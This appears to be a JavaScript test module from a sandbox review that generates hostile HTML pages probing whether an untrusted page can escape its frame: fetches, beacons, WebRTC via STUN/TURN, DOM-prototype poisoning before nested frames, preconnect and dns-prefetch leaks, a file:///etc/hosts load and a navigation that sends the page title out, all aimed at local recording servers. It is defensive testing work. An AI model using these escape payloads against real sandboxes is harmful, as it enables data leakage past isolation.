/**
 * What a free page might try, to reach past its frame: verify-wall.mjs runs these in WebKit, the desktop's
 * engine, and verify-pages.mjs runs the request probe in Chrome. Every address is 127.0.0.1: a recording
 * HTTP server (`http`), a UDP socket standing in for a STUN or TURN server (`udp`), and raw TCP listeners
 * that count connections a preconnect opens (`tcp`). Each page reports to the top window with postMessage.
 *
 * The attacks are the independent review's (lab/review-board/evidence/0.3-P2/sandbox-review, 0.3-P2-fix3):
 * a page that spoils the DOM's own functions before it makes a frame got a peer connection out past the
 * script wall fix1 put in the page's own window, and preconnect reached a host of the page's choosing with
 * no script at all.
 */

/** Every request a page can make over HTTP, each aimed at the recording server. Reports {probe, name, value}. */
export const requestProbe = (tag, SERVER, TRAP) => `<!doctype html><html><head><title>probe</title>
<link rel="stylesheet" href="${SERVER}/${tag}/link-css"><link rel="prefetch" href="${SERVER}/${tag}/prefetch">
<style>@font-face{font-family:x;src:url(${SERVER}/${tag}/font)} .bg{background:url(${SERVER}/${tag}/css-bg);font-family:x}</style>
<script src="${SERVER}/${tag}/script"></script></head><body>
<p class="bg">probe</p><img src="${SERVER}/${tag}/img"><img id="entity" src="&#104;ttp://127.0.0.1:${TRAP}/${tag}/entity-hidden"><img id="file" src="&#102;ile:///etc/hosts">
<video src="${SERVER}/${tag}/video"></video><svg><image href="${SERVER}/${tag}/svg-image"/></svg>
<iframe src="${SERVER}/${tag}/nested-frame"></iframe><object data="${SERVER}/${tag}/object"></object><embed src="${SERVER}/${tag}/embed">
<form id="f" action="${SERVER}/${tag}/form" method="post"><input name="a" value="b"></form>
<a id="ping" href="#here" ping="${SERVER}/${tag}/ping">ping</a><a id="hash" href="#here">hash</a><p id="here">here</p>
<script>
const report = (name, value) => parent.postMessage({probe: '${tag}', name, value: String(value)}, '*');
report('ran', true);
const tries = {
  fetch: () => fetch('${SERVER}/${tag}/fetch'),
  beacon: () => navigator.sendBeacon('${SERVER}/${tag}/beacon', 'x'),
  socket: () => new WebSocket('ws://127.0.0.1:${TRAP}/${tag}/socket'),
  events: () => new EventSource('${SERVER}/${tag}/event-source'),
  xhr: () => { const x = new XMLHttpRequest(); x.open('GET', '${SERVER}/${tag}/xhr'); x.send(); },
  worker: () => new Worker('data:text/javascript,fetch("${SERVER}/${tag}/worker")'),
  module: () => import('${SERVER}/${tag}/module.js'),
  storage: () => localStorage.getItem('x'),
  parentDom: () => parent.document.title,
  popup: () => window.open('${SERVER}/${tag}/popup'),
  top: () => { top.location.href = '${SERVER}/${tag}/top'; },
  form: () => document.getElementById('f').submit(),
  ping: () => document.getElementById('ping').click(),
  hash: () => document.getElementById('hash').click(),
  appAddress: () => setTimeout(() => location.assign(new URL('#away', document.baseURI)), 600),
  refresh: () => setTimeout(() => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${SERVER}/${tag}/refresh'; document.head.append(m); }, 800),
  self: () => setTimeout(() => { location.href = '${SERVER}/${tag}/self-after-1s?d=' + encodeURIComponent(document.title); }, 1000),
};
for (const [name, run] of Object.entries(tries)) { try { const out = run(); if (out && out.catch) out.catch(e => report(name, 'refused: ' + e.message)); report(name, 'tried'); } catch (e) { report(name, 'refused: ' + e.message); } }
addEventListener('load', () => report('entity-hidden-file', document.getElementById('file').naturalWidth));
</script></body></html>`;

const attr = s => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
const nestedRtc = (tag, udp, name) => `try{const pc=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${udp}"}]});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>top.postMessage({rtc:"${tag}",name:"${name}",value:"offer made"},"*"))}catch(e){top.postMessage({rtc:"${tag}",name:"${name}",value:"refused"},"*")}`;
/** A peer connection here and in every kind of frame a page can make of its own. Reports {rtc, name, value}. */
export const rtcProbe = (tag, UDP) => {
  const nested = name => nestedRtc(tag, UDP, name);
  return `<!doctype html><title>rtc</title><p>rtc</p><script>
const say = (name, value) => top.postMessage({rtc: '${tag}', name, value: String(value)}, '*');
say('ran', true);
(async () => { try { const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:127.0.0.1:${UDP}'}, {urls: 'turn:127.0.0.1:${UDP}', username: 'u', credential: 'p'}]}); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); say('here', 'offer made'); } catch (e) { say('here', 'refused'); } })();
try { const C = window.webkitRTCPeerConnection; say('webkit-prefixed', C ? 'present' : 'refused'); } catch (e) { say('webkit-prefixed', 'refused'); }
try { navigator.mediaDevices.enumerateDevices().then(() => say('media-devices', 'present'), () => say('media-devices', 'refused')); } catch (e) { say('media-devices', 'refused'); }
try { const t = new WebTransport('https://127.0.0.1:${UDP}/'); t.ready.then(() => say('webtransport', 'ready'), () => say('webtransport', 'refused')); } catch (e) { say('webtransport', 'refused'); }
{ const f = document.createElement('iframe'); f.srcdoc = '<script>${nested('srcdoc')}<\\/script>'; document.body.append(f); }
{ const d = document.createElement('div'); d.innerHTML = '<iframe srcdoc="<script>${attr(nested('parsed'))}<\\/script>"></iframe>'; document.body.append(d); }
{ const f = document.createElement('iframe'); f.src = 'javascript:"<script>${nested('javascript').replace(/"/g, '\\\\x22')}<\\/script>"'; document.body.append(f); }
try { const h = document.createElement('div'); document.body.append(h); h.attachShadow({mode: 'closed'}).innerHTML = '<iframe srcdoc="<script>${attr(nested('shadow'))}<\\/script>"></iframe>'; } catch (e) { say('shadow', 'refused'); }
</script><iframe srcdoc="<script>${attr(nested('markup'))}</script>"></iframe><div><template shadowrootmode="closed"><iframe srcdoc="<script>${attr(nested('markup-declarative'))}</script>"></iframe></template></div></html>`;
};

const head = tag => "<p>" + tag + "</p><script>const say=(n,v)=>top.postMessage({atk:'" + tag + "',n,v:String(v)},'*');say('ran',1);";
const nestedScript = (tag, udp) => '<script>' + nestedRtc(tag, udp, 'nested') + '<\/script>';
const inScript = s => JSON.stringify(s).replace(/<\//g, '<\\/');
/** The review's attacks, by name. `p` is {udp, tcp: [six ports], http}. Reports {atk, n, v} or {rtc, name, value}. */
export const attacks = {
  'rtc-self': (t, p) => rtcProbe(t, p.udp),
  'poison-remove': (t, p) => head(t) + "Element.prototype.remove=function(){};const f=document.createElement('iframe');f.srcdoc=" + inScript(nestedScript(t, p.udp)) + ";document.body.append(f);</" + "script>",
  'poison-matches': (t, p) => head(t) + "Element.prototype.matches=function(){throw new Error('no')};const f=document.createElement('iframe');f.srcdoc=" + inScript(nestedScript(t, p.udp)) + ";document.body.append(f);</" + "script>",
  'poison-then-markup': (t, p) => head(t) + "Element.prototype.remove=function(){};</" + "script><iframe srcdoc=\"" + attr(nestedScript(t, p.udp)) + "\"></iframe>",
  'poison-length': (t, p) => head(t) + "window.length=0;Object.defineProperty(Document.prototype,'documentElement',{get(){return null}});HTMLIFrameElement.prototype.remove=function(){};const f=document.createElement('iframe');f.srcdoc=" + inScript(nestedScript(t, p.udp)) + ";document.body.append(f);</" + "script>",
  preconnect: (t, p) => "<link rel=preconnect href='http://127.0.0.1:" + p.tcp[0] + "/'><link rel=preconnect href='https://127.0.0.1:" + p.tcp[1] + "/'><link rel=preconnect href='http://leak-a.localhost:" + p.tcp[2] + "/'><link rel=preconnect href='https://leak-b.localhost:" + p.tcp[3] + "/'>" + head(t) + "const l=document.createElement('link');l.rel='preconnect';l.href='http://127.0.0.1:" + p.tcp[4] + "/';document.head.append(l);</" + "script>",
  'dns-prefetch': (t, p) => "<link rel=dns-prefetch href='http://leak-c.localhost:" + p.tcp[5] + "/'><link rel=dns-prefetch href='//127.0.0.1:" + p.tcp[5] + "/'>" + head(t) + "</" + "script>",
  misc: (t, p) => head(t) + "const H='http://127.0.0.1:" + p.http + "/" + t + "';const tr=(n,f)=>{try{const r=f();if(r&&r.catch)r.catch(e=>say(n,'refused '+e.message));say(n,'tried')}catch(e){say(n,'refused '+e.message)}};"
    + "tr('fetchLater',()=>window.fetchLater?fetchLater(H+'/fetchlater',{activateAfter:0}):0);"
    + "tr('wsstream',()=>window.WebSocketStream?new WebSocketStream('ws://127.0.0.1:" + p.http + "/" + t + "/wss').opened:0);"
    + "tr('preload',()=>{const l=document.createElement('link');l.rel='preload';l.as='fetch';l.href=H+'/preload';document.head.append(l)});"
    + "tr('modulepreload',()=>{const l=document.createElement('link');l.rel='modulepreload';l.href=H+'/modulepreload';document.head.append(l)});"
    + "tr('opener',()=>open(H+'/open'));tr('history',()=>history.pushState(null,'',H+'/push'));"
    + "tr('download',()=>{const a=document.createElement('a');a.href=H+'/dl';a.download='x';a.click()});"
    + "tr('speculation',()=>{const s=document.createElement('script');s.type='speculationrules';s.textContent=JSON.stringify({prefetch:[{source:'list',urls:[H+'/spec-prefetch']}],prerender:[{source:'list',urls:[H+'/spec-prerender']}]});document.head.append(s)});"
    + "</" + "script><img srcset='http://127.0.0.1:" + p.http + "/" + t + "/srcset 1x'><svg><image href='http://127.0.0.1:" + p.http + "/" + t + "/svg'/></svg>",
  requests: (t, p) => requestProbe(t, 'http://127.0.0.1:' + p.http, p.http),
  /** The same requests from a frame the page makes of its own, which nothing takes out any more. */
  'nested-requests': (t, p) => "<script>addEventListener('message',e=>{if(e.data&&e.data.probe)top.postMessage(e.data,'*')})</" + "script><iframe srcdoc=\"" + attr(requestProbe(t, 'http://127.0.0.1:' + p.http, p.http)) + "\"></iframe>",
  /** A page that does nothing wrong, which must still work behind the wall. */
  legit: (t, p) => "<p>" + t + "</p><canvas id=c width=4 height=4></canvas><img id=d src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='><img id=a src='" + p.asset + "'>" + head(t) + "const g=document.getElementById('c').getContext('2d');g.fillStyle='#f00';g.fillRect(0,0,4,4);say('canvas',g.getImageData(1,1,1,1).data[0]);addEventListener('load',()=>{say('data-img',document.getElementById('d').naturalWidth);say('asset-img',document.getElementById('a').naturalWidth)});</" + "script>",
};
